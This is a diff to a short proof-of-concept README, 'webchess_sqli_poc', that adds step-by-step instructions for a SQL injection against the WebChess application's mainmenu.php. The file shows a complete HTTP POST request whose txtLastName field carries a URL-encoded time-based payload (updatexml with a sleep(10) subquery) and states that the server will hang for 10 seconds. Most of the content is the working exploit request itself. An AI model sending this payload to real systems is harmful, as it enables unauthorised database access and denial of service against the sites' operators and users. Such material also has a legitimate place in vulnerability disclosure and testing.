@@ -1,5 +1,9 @@
 # webchess_sqli_poc
 
+1. register 1 new user with password:123
+2. login as the new user
+3. send the following malicious packet
+
 POST /webchess/mainmenu.php HTTP/1.1
 
 Host: 127.0.0.1
@@ -45,3 +49,5 @@ Connection: close
 
 
 txtFirstName=test11&txtLastName=%27+or+updatexml%280%2Cconcat%280x7e%2C%28select+*+from+%28select%28sleep%2810%29%29%29a%29%29%2C0%29+or+%27&pwdOldPassword=123&pwdPassword=123&pwdPassword2=123&ToDo=UpdatePersonalInfo
+
+4. The server will be hanged for 10s
